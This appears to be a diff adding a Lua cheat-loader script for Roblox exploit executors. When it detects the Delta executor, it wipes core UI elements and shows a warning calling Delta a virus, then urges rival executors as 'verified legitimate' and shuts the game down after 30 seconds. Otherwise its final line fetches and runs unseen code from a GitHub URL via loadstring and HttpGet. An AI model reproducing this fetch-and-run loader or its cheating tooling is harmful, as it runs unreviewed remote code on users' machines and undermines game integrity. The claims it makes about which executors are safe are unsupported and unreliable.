@@ -1,0 +1,154 @@
+if identifyexecutor() == 'Delta' then
+    for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        pcall(function()
+            v:Destroy()
+        end)
+    end
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "WarningGUI"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    if syn and syn.protect_gui then
+        syn.protect_gui(gui)
+    end
+    gui.Parent = game:GetService("CoreGui")
+
+    -- Modern background with gradient
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.Position = UDim2.new(0, 0, 0, 0)
+    background.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
+    background.BorderSizePixel = 0
+    background.Parent = gui
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 40)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(44, 44, 60))
+    }
+    gradient.Parent = background
+
+    -- Modern container
+    local container = Instance.new("Frame")
+    container.AnchorPoint = Vector2.new(0.5, 0.5)
+    container.Position = UDim2.new(0.5, 0, 0.5, 0)
+    container.Size = UDim2.new(0.45, 0, 0.6, 0)
+    container.BackgroundTransparency = 0
+    container.BackgroundColor3 = Color3.fromRGB(34, 34, 44)
+    container.BorderSizePixel = 0
+    container.Parent = background
+    container.ClipsDescendants = true
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 18)
+    corner.Parent = container
+    local shadow = Instance.new("ImageLabel")
+    shadow.BackgroundTransparency = 1
+    shadow.Image = "rbxassetid://1316045217"
+    shadow.Size = UDim2.new(1, 40, 1, 40)
+    shadow.Position = UDim2.new(0, -20, 0, -20)
+    shadow.ZIndex = 0
+    shadow.ImageTransparency = 0.7
+    shadow.Parent = container
+
+    -- Data for executors
+    local executors = {
+        {name = "KRNL", link = "https://krnl.cat/"},
+        {name = "Codex", link = "https://codex.lol/"},
+        {name = "Arceus X", link = "https://spdmteam.com/index"},
+        {name = "Fluxus", link = "https://fluxus.team/download/"},
+    }
+
+    -- Buttons container (vertical)
+    local buttonsContainer = Instance.new("Frame")
+    buttonsContainer.Size = UDim2.new(1, -40, 0, #executors * 48)
+    buttonsContainer.Position = UDim2.new(0, 20, 0, 180)
+    buttonsContainer.BackgroundTransparency = 1
+    buttonsContainer.Parent = container
+    local list = Instance.new("UIListLayout")
+    list.FillDirection = Enum.FillDirection.Vertical
+    list.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    list.VerticalAlignment = Enum.VerticalAlignment.Top
+    list.SortOrder = Enum.SortOrder.LayoutOrder
+    list.Padding = UDim.new(0, 10)
+    list.Parent = buttonsContainer
+
+    -- Create modern buttons
+    for _, exec in ipairs(executors) do
+        local btn = Instance.new("TextButton")
+        btn.Text = "Copy " .. exec.name .. " Link"
+        btn.TextScaled = true
+        btn.Font = Enum.Font.GothamBold
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+        btn.BorderSizePixel = 0
+        btn.AutoButtonColor = true
+        btn.Size = UDim2.new(0.9, 0, 0, 40)
+        btn.Parent = buttonsContainer
+        local btnCorner = Instance.new("UICorner")
+        btnCorner.CornerRadius = UDim.new(0, 10)
+        btnCorner.Parent = btn
+        btn.MouseButton1Click:Connect(function()
+            if setclipboard then
+                setclipboard(exec.link)
+            end
+            btn.Text = "Copied!"
+            task.delay(1.5, function()
+                btn.Text = "Copy " .. exec.name .. " Link"
+            end)
+        end)
+    end
+
+    -- Modern labels
+    local function createLabel(text, color, size, yOffset, bold)
+        local label = Instance.new("TextLabel")
+        label.BackgroundTransparency = 1
+        label.Size = UDim2.new(1, -40, 0, size or 36)
+        label.Position = UDim2.new(0, 20, 0, yOffset or 0)
+        label.TextColor3 = color or Color3.new(1, 1, 1)
+        label.Text = text
+        label.Font = bold and Enum.Font.GothamBold or Enum.Font.Gotham
+        label.TextScaled = true
+        label.TextWrapped = true
+        label.Parent = container
+        return label
+    end
+    local y = 20
+    createLabel("⚠️  [Delta Executor Detected]  ⚠️", Color3.fromRGB(255, 255, 0), 38, y, true)
+    y = y + 38 + 4
+    createLabel("Warning: Delta Executor has been detected as a virus on this application.", Color3.fromRGB(255, 0, 0), 32, y, true)
+    y = y + 32 + 2
+    createLabel("This software collects your personal information and is highly detected by antivirus systems.", Color3.fromRGB(255,255,255), 26, y)
+    y = y + 26 + 2
+    createLabel("Please consider using one of the following trusted executors:", Color3.fromRGB(200, 255, 255), 24, y)
+    y = y + 24 + 2
+    createLabel("(KRNL, Codex, Arceus X, Fluxus)", Color3.fromRGB(0, 255, 255), 22, y)
+    y = y + 22 + 2
+    createLabel("These executors are supported and verified as legitimate.", Color3.fromRGB(200, 255, 200), 22, y)
+
+    -- Countdown label (bottom of container)
+    local countdownLabel = Instance.new("TextLabel")
+    countdownLabel.AnchorPoint = Vector2.new(0.5, 1)
+    countdownLabel.Position = UDim2.new(0.5, 0, 1, -16)
+    countdownLabel.Size = UDim2.new(1, -40, 0, 32)
+    countdownLabel.BackgroundTransparency = 1
+    countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    countdownLabel.TextScaled = true
+    countdownLabel.Font = Enum.Font.GothamBold
+    countdownLabel.Text = "Game will be closed in 30 seconds. Please install other executor"
+    countdownLabel.Parent = container
+
+    -- Countdown logic
+    local seconds = 30
+    spawn(function()
+        while seconds > 0 do
+            countdownLabel.Text = "Game will be closed in " .. seconds .. " second" .. (seconds == 1 and "" or "s") .. ". Please install other executor"
+            wait(1)
+            seconds -= 1
+        end
+        local Players = game:GetService("Players")
+        local player = Players.LocalPlayer
+        game:Shutdown()
+    end)
+    wait(999999)
+    return
+end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zanji-official/growagarden/refs/heads/main/3311"))()
